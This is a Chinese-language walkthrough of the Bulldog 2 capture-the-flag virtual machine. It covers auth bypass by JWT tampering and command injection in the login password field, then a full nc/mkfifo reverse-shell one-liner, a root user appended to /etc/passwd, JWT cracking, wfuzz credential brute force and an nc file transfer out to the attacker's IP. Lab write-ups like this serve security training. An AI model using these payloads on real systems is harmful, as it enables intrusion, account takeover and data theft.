VirtualBox双击打开，默认桥接模式，运行后会在界面直接告知IP！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.4.5 -p- -A

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Bulldog.social

--------------------------------------------
--------------------------------------------
2、web信息收集

访问：
http://192.168.4.5/

存在登录界面：
http://192.168.4.5/login

安全原因，不允许注册
上面测试了普通账号密码无法登录
dirb和nikto也没发现什么有用的，继续浏览！

--------------------------------------------
--------------------------------------------
3、Burpsuite绕过注册

测试加入：
{
  "name": "dayu",
  "email": "dayu@dayu.com",
  "username": "dayu",
  "password": "dayu"
}

回显：
{"success":false,"msg":"Incorrect Login"}
加了name和email后还是不行!

将post请求改为：
POST /users/register HTTP/1.1

回显：
{"success":true,"msg":"User registered"}
请求成功！

访问登录界面：
You are now logged in   ---成功登录


继续测试是否存在水平越权：再次注册dayutest
{
  "name": "dayutest",
  "email": "dayutest@dayu.com",
  "username": "dayutest",
  "password": "dayutest"
}

发现只需要在url：http://192.168.4.5/profile/dayu
后端修改注册后的用户名，都能直接登录进去！

--------------------------------------------
--------------------------------------------
4、burpsuite垂直越权登录admin

再次登录界面登录dayu用户重新抓包，查看到服务器回包信息：

Content-Type: application/json; charset=utf-8

"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJkYXl1IiwiZW1haWwiOiJkYXl1QGRheXUuY29tIiwidXNlcm5hbWUiOiJkYXl1IiwiYXV0aF9sZXZlbCI6InN0YW5kYXJkX3VzZXIifSwiaWF0IjoxNjUwMzMxMDM3LCJleHAiOjE2NTA5MzU4Mzd9.pWCvvQYm4-tbRXHUd4fSda7qMyXCqeb_vS-s772VR_Q"

谷歌搜索：JWT JSON

Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。

参考文章：
https://www.jianshu.com/p/576dbf44b2ae

通过官网解码：
https://jwt.io/
"auth_level": "standard_user"

回看主页面静态页面用curl -s查看很多js文件，因为这是json的type类型，查看发现很多js文件！
在js文件查找auth_level关键信息看看！

curl -s http://192.168.4.5/main.8b490782e52b9899e2a7.bundle.js | grep auth_level
在main...js文件中发现了存在：
if("master_admin_user"==n.auth_level)return this.user=n,!

这时候只需要修改下即可：
Do intercept -> Response to this request
修改："auth_level":"master_admin_user"

这时候右上角提示已经进入admin界面！点击！发现可以输入账号密码，继续分析！


延伸问题，js文件代码如何更优化的查看：
谷歌搜索：online js deobfuscator
任意点击：https://deobfuscate.io/
转码后丢到sublime下即可！

这时候在303行发现：isAdmin()函数
isAdmin() 函数通过检查他在本地存储中的auth_level是否为master_admin_user，检查用户是否是管理员！
那么这时候直接修改即可！


或者火狐插件查看：
用了 Angular JS 框架：
AngularJS是一个应用设计框架与开发平台，用于创建高效、复杂、精致的单页面应用，通过新的属性和表达式扩展了HTML，实现一套框架，多种平台，移动端和桌面端。 AngularJS有着诸多特性，最为核心的是：MVVM、模块化、自动化双向数据绑定、语义化标签、依赖注入等等。

使用 webpack 捆绑应用程序
https://docs.aws.amazon.com/zh_cn/sdk-for-javascript/v3/developer-guide/webpack.html

--------------------------------------------
--------------------------------------------
5、burpsuite远程命令执行

继续抓包输入任意用户名密码测试：
-----
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 19 Apr 2022 03:23:23 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 40
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"28-44Xo62/YZrQm4R4i7yg1FLYkPXI"

{"success":false,"msg":"Wrong password"}
-----
发送后发现，返回的是200 OK成功了，但是是错误的密码false，可能存在命令执行漏洞！测试下！

{
  "username": "dayu1",
  "password": "dayu1""
}
添加了一个双引号："
/var/www/node/Bulldog-2-The-Reckoning/
可看到回显暴露了底层目录和文件信息！

谷歌：Bulldog-2-The-Reckoning github
发现：https://github.com/Frichetten/Bulldog-2-The-Reckoning
查看源码：
在user.js源码中：
74~84行中提示，用户名和密码参数被传递给exec函数，没有经过任何过滤，容易受到RCE（远程代码执行）的影响！

-----
日常用法：
tcpdump -nni eth0 （比较常用）
-nn Don't convert protocol and port numbers etc. to names either.（不转换协议端口号）
参考文章：https://blog.csdn.net/sj349781478/article/details/84023721
-----

用ping测试下：
kali开启：tcpdump -nni eth0 icmp
;ping 192.168.4.6 -c 4    ---在密码界面输入即可！
获得回显：23:31:39.140377 IP 192.168.4.5 > 192.168.4.6: ICMP echo request, id 2115, seq 1, length 64
说明可执行命令！


nc -vlp 1234
在密码后面加入：
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.4.6 1234 >/tmp/f

成功获得反弹shell！
python -c 'import pty; pty.spawn("/bin/bash")'

--------------------------------------------
--------------------------------------------
6、内部信息收集

1）127.0.0.1:27017
2）用户信息枚举
admin:x:1000:1004:admin:/home/admin:/bin/bash  27(sudo)
node:x:1001:1005:,,,:/home/node:/bin/bash
root:x:0:0:root:/root:/bin/bash
3）[+] Writable passwd file? ................ /etc/passwd is writable


--------------------------------------------
--------------------------------------------
7、提权
perl -le 'print crypt("dayu","aa")'
echo 'dayuroot:aaP.3CTQfJaLg:0:0:dayuroot:/root:/bin/bash' >>/etc/passwd

su dayuroot

成功获得root权限！



--------------------------------------------
--------------------------------------------
项目二十四：知识回顾
2）JWT

将pw内容丢入谷歌，发现这是JWT（JSON Web 令牌）！----果然和第一部分验证的JWT是提示！

什么是JWT？ JSON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简介的、自包含的协议格式，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。JWT可以使用HMAC算法或使用RSA的公 钥/私钥对来签名，防止被篡改。
参考：
https://blog.csdn.net/guohao_1/article/details/89951178

JWT 具有这种格式的三个部分：
base64(header).base64(payload).base64(signature)
1. header在 JSON 中指定算法和类型。
2. payload指定令牌的声明，也在 JSON 中。
3. signature是编码头和有效载荷的数字签名。

在线查看：
https://jwt.io/#debugger

开始破解：
proxychains git clone https://github.com/brendan-rius/c-jwt-cracker.git
cd jwt-cracker
apt-get install libssl-dev
make

./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
Secret is "mlnV1"   ----等待几分钟


或者用：https://github.com/lmammino/jwt-cracker
--------------------------------------------
--------------------------------------------
9、另外一种思路教学！
访问主页会发现user模块，点击进入会发现很多人名信息：
http://192.168.4.5/users   ---加入拥有超过 15,000 名会员的发展最快的社交网络之一！

接下来思路就是字典爬取->wfuzz暴力模糊测试！


1）字典爬取
在使用bp拦截的位置：http history发现
http://192.168.4.5/users/getUsers?limit=9

bp右下角输入username，回显15,762个用户信息！

因为该框架是josn的，Javascript是不可读格式的，cewl爬取会很多无法识别，另外介绍技巧：

jq可以对json数据进行分片、过滤、映射和转换，和sed、awk、grep等命令一样，都可以让你轻松地把玩文本。 它能轻松地把你拥有的数据转换成你期望的格式，而且需要写的程序通常也比你期望的更加简短。 jq是用C编写，没有运行时依赖，所以几乎可以运行在任何系统上。

专门爬json代码的！参考文章：
https://blog.csdn.net/whatday/article/details/105781873
最简单的jq程序是表达式"."，它不改变输入，但可以将其优美地输出，便于阅读和理解！
curl http://192.168.4.5/users/getUsers | jq .

curl http://192.168.4.5/users/getUsers | jq .| grep username

在利用cut命令：参考文章：
https://www.runoob.com/linux/linux-comm-cut.html
Linux cut命令用于显示每行从开头算起 num1 到 num2 的文字！
-f ：与-d一起使用，指定显示哪个区域。
-d ：自定义分隔符，默认为制表符。

curl http://192.168.4.5/users/getUsers | jq .| grep username| cut -f4 -d"\"">users

wc -l users 
15762 users
成功爬取15762个用户名！

2）wfuzz模糊测试

bp在登录页面抓包，任意输入账号密码：

wfuzz -w users -w /usr/share/wordlists/fasttrack.txt \
-H "Host: 192.168.4.5" \
-H "Accept: application/json, text/plain, */*" \
-H "Referer: http://192.168.4.5/login" \
-H "Content-Type: application/json" \
-d "{\"username\":\"FUZZ\",\"password\":\"FUZ2Z\"}" --hc=401 -t 25 -c http://192.168.4.5/users/authenticate

或者用burpsuite爆破！




知识拓展：代码审计
nc -l -p 8888 > web.tar.gz   ---kali执行
nc 192.168.4.6 8888 < web.tar.gz    ---项目环境执行，指向kali ip



















































































